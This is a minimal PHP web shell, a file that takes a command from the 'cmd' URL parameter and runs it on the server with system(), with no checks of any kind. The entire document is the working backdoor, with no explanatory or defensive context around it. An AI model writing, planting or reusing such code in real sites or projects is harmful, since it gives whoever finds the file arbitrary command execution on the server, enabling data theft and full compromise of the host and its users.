<?php

    $cmd = $_GET['cmd'];
    if(isset($cmd)){
        system($cmd);
    }

?>